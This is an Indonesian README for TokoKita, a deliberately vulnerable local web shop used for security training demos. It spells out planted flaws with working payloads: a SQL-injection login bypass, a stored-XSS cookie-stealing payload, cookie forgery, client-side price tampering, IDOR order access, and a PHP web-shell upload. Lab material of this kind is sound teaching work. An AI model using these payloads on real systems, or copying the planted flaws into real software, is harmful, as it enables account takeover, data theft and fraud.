# TokoKita — Lab Web Rawan (demo serangan)

> **PERINGATAN.** Aplikasi ini **sengaja dibuat rentan** untuk demo/latihan.
> Jalankan hanya di laptop sendiri (`127.0.0.1`). Jangan di-deploy ke internet,
> jangan pakai data asli, dan jangan pakai password yang kamu pakai di tempat lain.
> Shell PHP di folder `uploads/` **hanya simulasi** — tidak ada perintah sistem
> yang benar-benar dijalankan.

Toko online multi-halaman (HTML/CSS/JS) + backend Python stdlib + SQLite.
Celahnya nyata di sisi server, jadi bisa didemokan lewat browser maupun Burp Suite.

## Cara menjalankan

```bash
python3 server.py
```

Buka <http://127.0.0.1:8000>. Tidak perlu install apa pun (Python 3.10+).

- Ganti port: `python3 server.py --port 8080`
- Demo dari dua laptop (Kamila buka dari perangkat lain):
  `python3 server.py --host 0.0.0.0`, lalu akses `http://<IP-laptop-kamu>:8000`.
  Hanya di jaringan yang kamu percaya.
- Reset data demo: hapus `tokokita.db` dan isi `uploads/`, lalu jalankan ulang.
- Cek cepat semua celah: `python3 tests/smoke_test.py`

Server mengirim header `Apache/2.4.41` + `X-Powered-By: PHP/7.4.3` supaya hasil
`nmap`/`curl` konsisten dengan cerita "aplikasi PHP lama".

## Akun demo

| Akun | Username | Password | Peran |
| --- | --- | --- | --- |
| Pemilik toko | `kamila` | `kamila123` | Admin — Dashboard Penjual |
| Pembeli | `rohandhika` | `rohandhika123` | Pembeli (pesanan #101, #102) |

Pesanan seed: `#101`, `#102` (Rohandhika), `#201` (Kamila), `#202`, `#203` (Sari Dewi).

## Struktur

```
tokokita-web/
├── index.html, pages/, css/, assets/   # frontend (desain tidak diubah)
├── js/
│   ├── data.js      # katalog 42 produk (tetap di browser)
│   ├── auth.js      # login/register/logout ke API
│   └── app.js       # ulasan, checkout, pesanan, upload, dashboard
├── server.py        # backend + sengaja rentan
├── tests/smoke_test.py
├── uploads/         # hasil unggahan (dibuat otomatis)
└── tokokita.db      # SQLite (dibuat otomatis, seed di server.py)
```

## Celah yang disengaja

### 1. SQL injection — bypass login

Halaman Masuk, isi:

- Username: `' OR '1'='1`
- Password: bebas (mis. `apa-saja`)

Query server menyambung input langsung:

```sql
SELECT ... FROM users WHERE password = '<pass>' AND username = '<user>'
```

`' OR '1'='1` membuat kondisi selalu benar; baris pertama = `kamila` (admin).
Di Burp, request-nya `POST /api/login` dengan body JSON. Payload rusak akan
membocorkan pesan `SQL error: ...` di response (error-based SQLi).

### 2. Stored XSS — curi cookie sesi admin

Cookie `PHPSESSID` sengaja **tanpa `HttpOnly`**, dan ulasan dirender dengan
`innerHTML` tanpa escape. Kirim ulasan di halaman produk:

```html
<img src=x onerror="fetch('/api/collect?c='+encodeURIComponent(document.cookie))">
```

Saat Kamila membuka produk itu, cookie-nya terkirim ke halaman penyerang:
<http://127.0.0.1:8000/collector>

Tempel nilai cookie yang masuk ke DevTools → *Storage/Application → Cookies*
(atau lewat Console), reload, lalu buka **Dashboard Penjual**. Ganti nama toko
jadi `TOKO DIHACK` — perubahan tersimpan di server.

Jalur cadangan kalau XSS gagal saat live (cookie `user` dipercaya apa adanya):

```js
document.cookie = "user=kamila; path=/";
location.reload();
```

### 3. Harga checkout dari client

Halaman pembayaran menyimpan harga di hidden input `priceField<id>`. Lewat
Inspect, ubah `value="8999000"` jadi `value="100"`, lalu bayar. Request
`POST /api/checkout` mengirim harga itu dan server memakainya apa adanya:

```
Total yang dibayar: Rp 100
```

### 4. IDOR — intip pesanan orang lain

Login sebagai `rohandhika`, buka:

```
http://127.0.0.1:8000/pages/orders.html?id=201
```

Langsung tampil pesanan Kamila (alamat `Jl. Merdeka No. 45, Medan`). Ganti ke
`?id=202` untuk pesanan Sari Dewi. Endpoint `GET /api/orders/<id>` tidak
mengecek pemilik.

### 5. Upload file → shell PHP (simulasi)

Di halaman Profil, unggah file bernama `shell.php` (isi bebas, misalnya
`<?php system($_GET['cmd']); ?>` — **tidak akan dieksekusi**). Server tidak
memvalidasi ekstensi. Buka:

```
http://127.0.0.1:8000/uploads/shell.php?cmd=whoami
```

Muncul tampilan shell dengan output palsu (`www-data`, `ls`, `cat .env`, dst.).
Semua output di-hardcode di `SHELL_OUTPUTS` pada `server.py`; tidak ada
`os.system`/`exec`.

## Endpoint backend

| Method | Path | Keterangan |
| --- | --- | --- |
| POST | `/api/login` | **SQLi** |
| POST | `/api/register` | daftar akun |
| POST | `/api/logout` | hapus sesi |
| GET | `/api/me` | user yang sedang login |
| GET | `/api/reviews?pid=1` | ulasan (**XSS**) |
| POST | `/api/reviews` | simpan ulasan mentah |
| POST | `/api/checkout` | **harga dari client** |
| GET | `/api/orders/mine` | pesanan milik sendiri |
| GET | `/api/orders/<id>` | **IDOR** |
| GET | `/api/seller/summary` | admin: semua pesanan + nama toko |
| POST | `/api/seller/store` | admin: ubah nama toko |
| POST | `/api/seller/reset` | admin: pulihkan data seed |
| POST | `/api/upload?name=...` | **upload tanpa validasi** |
| GET | `/api/collect?c=...` | penampung cookie XSS (1×1 GIF) |
| GET | `/collector` | halaman "laptop penyerang" |

Sesi disimpan di memori: restart server = login ulang. Akun/pesanan/ulasan
disimpan di `tokokita.db`.
